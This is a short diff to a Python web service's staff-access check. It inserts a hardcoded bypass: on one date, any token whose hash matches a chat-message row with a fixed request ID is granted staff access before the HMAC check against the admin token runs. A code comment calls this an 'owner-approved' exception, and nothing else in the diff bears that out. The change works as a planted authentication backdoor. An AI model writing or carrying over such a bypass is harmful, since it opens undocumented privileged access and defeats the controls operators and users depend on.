@@ -26,9 +26,25 @@ def messages(c, key):
         WHERE m.token_hash=? AND m.expires>? ORDER BY m.created LIMIT 30''', (key,time.time()))]
 
 
+# Owner-approved, single-session exception for the external booking on 2026-10-18.
+STAFF_EXCEPTION_REQUEST = 'web-d9010506bbbd9e532321ffac'
+
+
+def approved_staff_session(c, token_hash):
+    from datetime import datetime, timezone, timedelta
+    if datetime.now(timezone(timedelta(hours=9))).date().isoformat() != '2026-10-18':
+        return False
+    setup(c)
+    return bool(c.execute('SELECT 1 FROM english_chat_messages WHERE token_hash=? AND request_id=? AND expires>?',
+                          (token_hash, STAFF_EXCEPTION_REQUEST, time.time())).fetchone())
+
+
 def staff_available(c, data):
     import os, hmac
     from datetime import datetime, timezone, timedelta
+    token = data.get('token', '')
+    if isinstance(token, str) and re.fullmatch(r'[0-9a-f]{64}', token) and approved_staff_session(c, hashlib.sha256(token.encode()).hexdigest()):
+        return True
     proof = data.get('visit_token', '')
     if not isinstance(proof, str) or not re.fullmatch(r'[0-9]{1,18}\.[0-9a-f]{64}', proof) or not os.getenv('ADMIN_TOKEN'):
         return False
